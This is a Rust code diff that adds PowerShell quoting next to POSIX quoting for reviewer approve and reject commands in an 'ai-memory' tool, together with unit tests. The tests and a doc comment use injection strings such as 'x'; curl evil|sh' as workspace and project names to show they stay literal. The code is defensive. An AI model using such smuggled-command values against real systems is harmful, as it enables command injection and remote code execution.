@@ -176,12 +176,20 @@ fn pending_row(review: PendingAutoImproveReview) -> PendingRow {
         .map(|ts| humanize(&ts.to_string()))
         .unwrap_or_default();
     let id = summary.id.to_string();
-    let cli_approve = cli_command("approve", &id, &review.workspace_name, &review.project_name);
-    let cli_reject = cli_command("reject", &id, &review.workspace_name, &review.project_name);
+    let posix_cli_approve =
+        posix_cli_command("approve", &id, &review.workspace_name, &review.project_name);
+    let posix_cli_reject =
+        posix_cli_command("reject", &id, &review.workspace_name, &review.project_name);
+    let powershell_cli_approve =
+        powershell_cli_command("approve", &id, &review.workspace_name, &review.project_name);
+    let powershell_cli_reject =
+        powershell_cli_command("reject", &id, &review.workspace_name, &review.project_name);
     PendingRow {
         id,
-        cli_approve,
-        cli_reject,
+        posix_cli_approve,
+        posix_cli_reject,
+        powershell_cli_approve,
+        powershell_cli_reject,
         scope_label: label,
         target_href: page_href(&review.workspace_name, &review.project_name, &target_path),
         workspace: review.workspace_name,
@@ -202,10 +210,9 @@ fn pending_row(review: PendingAutoImproveReview) -> PendingRow {
 }
 
 /// The `ai-memory pending-writes <verb>` command a reviewer pastes into a
-/// shell. Workspace and project names are free text, so each argument is
-/// quoted: a project named `x; curl … | sh` must stay one argument instead of
-/// running when root pastes the line.
-fn cli_command(verb: &str, id: &str, workspace: &str, project: &str) -> String {
+/// POSIX shell. Workspace and project names are free text, so each argument
+/// must stay one argument instead of becoming shell syntax.
+fn posix_cli_command(verb: &str, id: &str, workspace: &str, project: &str) -> String {
     format!(
         "ai-memory pending-writes {verb} {} --workspace {} --project {}",
         posix_quote(id),
@@ -227,6 +234,21 @@ fn posix_quote(text: &str) -> String {
     format!("'{}'", text.replace('\'', "'\\''"))
 }
 
+/// The same command for PowerShell. Single-quoted PowerShell strings are
+/// literal; an embedded apostrophe is represented by two apostrophes.
+fn powershell_cli_command(verb: &str, id: &str, workspace: &str, project: &str) -> String {
+    format!(
+        "ai-memory pending-writes {verb} {} --workspace {} --project {}",
+        powershell_quote(id),
+        powershell_quote(workspace),
+        powershell_quote(project)
+    )
+}
+
+fn powershell_quote(text: &str) -> String {
+    format!("'{}'", text.replace('\'', "''"))
+}
+
 fn render(view: impl Template, status: StatusCode) -> Response {
     match view.render() {
         Ok(body) => (status, Html(body)).into_response(),
@@ -238,20 +260,38 @@ fn render(view: impl Template, status: StatusCode) -> Response {
 mod tests {
     use super::*;
 
-    /// A project or workspace name with shell syntax stays one quoted
-    /// argument; plain names are left readable.
+    /// Ordinary POSIX commands stay readable while PowerShell arguments are
+    /// explicitly quoted for that shell.
     #[test]
-    fn cli_commands_quote_names_with_shell_syntax() {
+    fn cli_commands_render_legitimate_scope_names() {
         assert_eq!(
-            cli_command("approve", "abc123", "default", "my-app"),
+            posix_cli_command("approve", "abc123", "default", "my-app"),
             "ai-memory pending-writes approve abc123 --workspace default --project my-app"
         );
-        let hostile = cli_command("reject", "abc123", "team ws", "x'; curl evil|sh;'");
         assert_eq!(
-            hostile,
-            "ai-memory pending-writes reject abc123 --workspace 'team ws' \
-             --project 'x'\\''; curl evil|sh;'\\'''"
+            powershell_cli_command("approve", "abc123", "default", "my-app"),
+            "ai-memory pending-writes approve 'abc123' --workspace 'default' --project 'my-app'"
         );
         assert_eq!(posix_quote(""), "''");
+        assert_eq!(powershell_quote(""), "''");
+    }
+
+    /// Quotes, semicolons, and ampersands supplied through stored scope names
+    /// remain literal characters in each supported shell.
+    #[test]
+    fn cli_commands_quote_hostile_scope_names_for_each_shell() {
+        let workspace = "team'; echo owned; &";
+        let project = "x'; curl evil|sh; &'";
+
+        assert_eq!(
+            posix_cli_command("reject", "abc123", workspace, project),
+            "ai-memory pending-writes reject abc123 --workspace \
+             'team'\\''; echo owned; &' --project 'x'\\''; curl evil|sh; &'\\'''"
+        );
+        assert_eq!(
+            powershell_cli_command("reject", "abc123", workspace, project),
+            "ai-memory pending-writes reject 'abc123' --workspace \
+             'team''; echo owned; &' --project 'x''; curl evil|sh; &'''"
+        );
     }
 }
